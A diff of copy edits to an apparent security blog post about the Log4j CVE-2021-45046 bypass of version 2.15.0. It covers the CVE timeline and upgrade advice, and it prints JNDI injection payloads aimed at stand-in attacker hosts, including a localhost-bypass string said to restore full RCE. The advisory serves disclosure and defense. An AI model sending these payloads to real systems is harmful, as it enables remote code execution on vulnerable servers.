@@ -29,19 +29,19 @@ _The logo gets worse as the situation gets worse..._
 
 _Originally Posted @ December 17th & Last Updated @ December 19th, 3:37pm PST_
 
-Earlier today, the second Log4j vulnerability (CVE-2021-45046) was upgraded from a [CVSS score of 3.7](https://web.archive.org/web/20211215180723/https://logging.apache.org/log4j/2.x/security.html)
+Earlier today, the second Log4j vulnerability (CVE-2021-45046), was upgraded from a [CVSS score of 3.7](https://web.archive.org/web/20211215180723/https://logging.apache.org/log4j/2.x/security.html)
 (limited DOS) to a [CVSS score of 9.0](https://logging.apache.org/log4j/2.x/security.html) (limited RCE). ~~Note: the reported
 limited RCE has only been proven to be exploitable on macOS at the moment. We expect, in time, that other operating systems
 will also be shown to be exploitable.~~ Update: More operating systems have been showing to be vulnerable: MacOS, Fedora, Arch Linux, and Alpine Linux.
 
-See the bottom of this post for an example exploit payload that bypasses the checks in log4j 2.15.0.
+See the bottom of this post for an example exploit payload that bypasses the checks in log4j `2.15.0`.
 
 **Just trying to patch Log4Shell? Please read our dedicated
 [Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).**
 
 ## Context on CVE Timeline
 
-The Log4j team had previously released version 2.15.0 on December 6th to address, which at the time had only been
+The Log4j team had previously released version `2.15.0` on December 6th to address, which at the time had only been
 privately disclosed, the Log4Shell vulnerability that abused JNDI and LDAP to allow for an easily exploitable RCE
 vulnerability. We posted a
 [blog post](https://www.lunasec.io/docs/blog/log4j-zero-day/) about this new RCE that, at the time, was only being posted
@@ -53,31 +53,31 @@ The following day, on December 10th, an official CVE was associated with this RC
 10.0.
 
 In the days afterwards, it was realized that this fix was incomplete as bypasses were found that could result in a
-limited DOS for 2.15.0 users and, for users that had patched older Log4j releases using `formatMsgNoLookups`, these
+limited DOS for `2.15.0` users, and, for users that had patched older Log4j releases using `formatMsgNoLookups`, these
 bypasses could be used to allow for limited RCE.
 
-Version 2.16.0 was released on December 13th to address the vulnerabilities by completely disabling JNDI by default.
+Version `2.16.0` was released on December 13th to address the vulnerabilities by completely disabling JNDI by default.
 The next day, on December 14th, the second vulnerability was officially given a dedicated CVE numbered CVE-2021-45046
 with a limited 3.7 (now 9.0).
 
-In this post, we're going to talk about the impact of these changes and why the CVSS score has changed so drastically.
+In this post, we're going to talk about the impact of these changes, and about why the CVSS score has changed so drastically.
 
 <!--truncate-->
 
-## Understanding the new Bypass
+## Understanding the new bypass
 
-With more attention on Log4j library now from the security community, we have seen security researchers digging into the
+With more attention on the Log4j library now from the security community, we have seen security researchers digging into the
 source code of this project. @pwntester [announced on Twitter](https://twitter.com/pwntester/status/1471465662975561734)
-that there is a possible RCE still present in 2.15.0, under certain conditions.
+that there is a possible RCE still present in `2.15.0`, under certain conditions.
 
-> 2.15 with no formatMsgNoLookups mitigations is still vulnerable to RCE. 2.15.0 w/o those mitigations is vulnerable only
-if attackers can control non-message parts of the pattern layout. Just to make it clear 2.15.0 disables message text lookups
-by default, users need to enable them explicitly in the patterns with %m{lookups}. So mitigations are in place by default in 2.15.0
+> `2.15.0` with no formatMsgNoLookups mitigations is still vulnerable to RCE. `2.15.0` without those mitigations is vulnerable only
+if attackers can control non-message parts of the pattern layout. Just to be clear, `2.15.0` disables message text lookups
+by default- users need to enable them explicitly in the patterns with %m{lookups}. So mitigations are in place by default in `2.15.0`.
 
-Version 2.15.0 was released in order to prevent RCE by only allowing LDAP connections to local addresses by default. This
+Version `2.15.0` was released in order to prevent RCE by only allowing LDAP connections to local addresses by default. This
 development for the CVE means that there exists a bypass to these newly added security measures. Not everyone who has updated
-to 2.15.0 is vulnerable to RCE as it requires a specific logging configuration. Since the `formatMsgNoLookups` property
-is on by default in 2.15.0, to be vulnerable to this RCE, message text lookups must be manually enabled with `%m{lookups}`.
+to `2.15.0` is vulnerable to RCE as it requires a specific logging configuration. Since the `formatMsgNoLookups` property
+is on by default in `2.15.0`, to be vulnerable to this RCE, message text lookups must be manually enabled with `%m{lookups}`.
 
 However, there even still are other ways in which a message lookup can take place. Some examples are discussed on the Log4j
 security page:
@@ -87,7 +87,7 @@ there are still code paths in Log4j where message lookups could occur: known exa
 Logger.printf("%s", userInput), or applications that use a custom message factory, where the resulting messages do not
 implement StringBuilderFormattable. There may be other attack vectors.
 
-To summarize, 2.15.0 introduced changes to prevent remote connections in a message lookup (ie. a connection to `some-attacker.com`
+To summarize, `2.15.0` introduced changes to prevent remote connections in a message lookup (ie. a connection to `some-attacker.com`
 will be blocked in: `${jndi:ldap://some-attacker.com/a}`), as well as disabled message lookups when logging by default:
 
 ```
@@ -97,7 +97,7 @@ String attackerData = "${jndi:ldap://some-attacker.com/a}";
 logger.info("Log string, but no lookup will happen: " + attackerData);
 ```
 
-These changes were still not enough to prevent message lookups by default as there are other places in code where this could take place:
+These changes were still not enough to prevent message lookups by default as there are other places in the code where this could take place:
 
 ```
 // Put attacker controlled data in
@@ -111,20 +111,20 @@ An example `log4j2.properties` file might look something like:
 appender.console.layout.pattern = ${ctx:layout-pattern-value} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
 ```
 
-However, since only local connections were allowed in 2.15.0, the impact of this vulnerability were minimal.
-The most impactful way to exploit this vulnerability was to have `String attackerData = "${ctx:layout-pattern-value"`
+However, since only local connections were allowed in `2.15.0`, the impacts of this vulnerability were minimal.
+The most impactful way to exploit this vulnerability was to have `String attackerData = "${ctx:layout-pattern-value"`,
 which would result in a recursive reference in the lookup. With the reported bypass of the restrictive remote connection
 list, a full RCE is possible in the above code as we can access `some-attacker.com` now.
 
-It is strongly recommended that you update to ~~2.16.0~~ 2.17.0 (Updated 12/19), even if you have previously updated to 2.15.0 or 2.16.0, to mitigate these
-new bypasses. (Updated 12/19 due to new DOS found in 2.16.0. Please upgrade to 2.17.0 to mitigate issues in previous versions.)
+It is strongly recommended that you update to ~~`2.16.0`~~ `2.17.0` (updated 12/19), even if you have previously updated to `2.15.0` or `2.16.0`, to mitigate these
+new bypasses. (Updated 12/19 due to new DOS found in `2.16.0`. Please upgrade to `2.17.0` to mitigate issues in previous versions.)
 
-## Update: The localhost Bypass was Discovered!
+## Update: The localhost Bypass is Discovered!
 
-It was [posted](https://twitter.com/marcioalm/status/1471740771581652995) on Twitter by Márcio Almeida early on
+The bypass was [posted](https://twitter.com/marcioalm/status/1471740771581652995) on Twitter by Márcio Almeida early on
 December 17th.
 
-This payload will bypass the network host restrictions in log4j 2.15.0 and allow full RCE again:
+This payload will bypass the network host restrictions in log4j `2.15.0` and allow full RCE again:
 ```
 ${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
 ```
@@ -145,7 +145,7 @@ this yet.
 Please follow us on [Twitter](https://twitter.com/LunaSecIO) or add yourself to our mailing list below, and we'll
 update you when we publish new findings.
 
-And if this post helped you, please share it with others to help them too.
+If this post helped you, please share it with others to help them too.
 
 import ContactForm from '../src/components/ContactForm.jsx'
 
@@ -154,9 +154,9 @@ import ContactForm from '../src/components/ContactForm.jsx'
 ## Additional Information
 
 We have published a series of posts about Log4Shell on our blog that you might be interested in:
-- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**,
-- **[Original Log4Shell Announcement](https://www.lunasec.io/docs/blog/log4j-zero-day/)**,
-- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**,
+- **[Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)**
+- **[Original Log4Shell Announcement](https://www.lunasec.io/docs/blog/log4j-zero-day/)**
+- **[Part 1: Log4Shell Live Patch (Background Context)](https://www.lunasec.io/docs/blog/log4shell-live-patch/)**
 - **[Part 2: Log4Shell Live Patch (Technical Deep-Dive)](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)**
 
 ### Limited Offer: Free Security Assistance
@@ -176,6 +176,6 @@ If you would like to contribute, or notice any errors, this post is an Open Sour
 
 ### Edits
 
-1. Added a note that the RCE has only been provably exploitable on macOS
+1. Added a note that RCE has only been provably exploitable on macOS.
 2. 12/19/21: Updated info about 2.17.0 release due to CVE.
 1. Added a note that the RCE has been provably exploitable on MacOS, Fedora, Arch Linux, and Alpine Linux.
